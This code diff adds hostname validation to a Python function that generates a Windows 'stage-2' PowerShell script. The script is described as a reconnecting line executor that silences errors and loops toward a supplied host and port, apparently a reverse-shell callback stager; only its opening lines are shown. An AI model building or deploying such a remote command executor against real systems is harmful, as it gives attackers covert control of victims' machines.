@@ -184,11 +184,22 @@ if __name__ == "__main__":
 '''
 
 
+def _safe_host(host: str) -> str:
+    """H13: only allow hostname/IP chars for PowerShell interpolation."""
+    import re
+
+    h = (host or "").strip()
+    if not re.fullmatch(r"[A-Za-z0-9._:-]{1,253}", h):
+        raise ValueError("invalid public_host for stage-2")
+    return h
+
+
 def windows_stage2_script(host: str, port: int) -> str:
     """PowerShell reconnecting line executor with SC5_PING support."""
+    safe = _safe_host(host)
     return f'''
 $ErrorActionPreference = 'SilentlyContinue'
-$h = '{host}'
+$h = '{safe}'
 $p = {int(port)}
 $delay = 3
 while ($true) {{
